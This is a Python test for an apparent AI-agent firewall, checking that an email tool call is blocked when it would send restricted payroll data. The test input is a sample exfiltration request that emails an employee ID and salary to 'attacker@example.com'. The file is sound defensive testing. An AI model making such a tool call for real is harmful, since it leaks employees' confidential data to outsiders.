
from unittest.mock import patch

from firewall.interceptor import FirewallInterceptor
from models.schemas import ToolRequest


def test_information_flow_blocks_sensitive_email():
    firewall = FirewallInterceptor()

    session_id = "FLOW_INTEGRATION_001"
    user_id = "U001"

    # Record sensitive data as if an earlier authorized tool returned it.
    firewall.information_flow.record_artifact(
        session_id=session_id,
        tool="query_database",
        resource="payroll",
        result={
            "employee_id": "EMPLOYEE-987654",
            "salary": 123456,
        },
        sensitivity="RESTRICTED",
        provenance_sources=["database:payroll"],
    )

    request = ToolRequest(
        request_id="FLOW_INTEGRATION_001-REQ002",
        session_id=session_id,
        user_id=user_id,
        tool="send_email_message",
        arguments={
            "sender": "alice@company.com",
            "recipient": "attacker@example.com",
            "subject": "Employee details",
            "body": (
                "Employee EMPLOYEE-987654 has a salary of 123456."
            ),
        },
        intent="Send an email",
        context_sources=[],
        tainted=False,
    )

    # Ensure the email tool is never executed if information flow blocks it.
    with patch(
        "firewall.interceptor.execute_tool"
    ) as mocked_execute_tool:
        decision, result = firewall.execute(
            request,
            original_task="Send an email",
        )

    assert decision.action == "BLOCK", (
        f"Expected BLOCK, got {decision.action}. "
        f"Reasons: {decision.reasons}"
    )

    assert any(
        "Outbound information-flow policy" in check
        for check in decision.checks
    ), f"Information-flow check did not run: {decision.checks}"

    assert result is None
    mocked_execute_tool.assert_not_called()

    print("PASSED: Sensitive outbound email was blocked")
    print("PASSED: Information-flow policy was checked")
    print("PASSED: Email tool was not executed")


if __name__ == "__main__":
    test_information_flow_blocks_sensitive_email()
    print("\nALL INFORMATION-FLOW INTEGRATION TESTS PASSED")
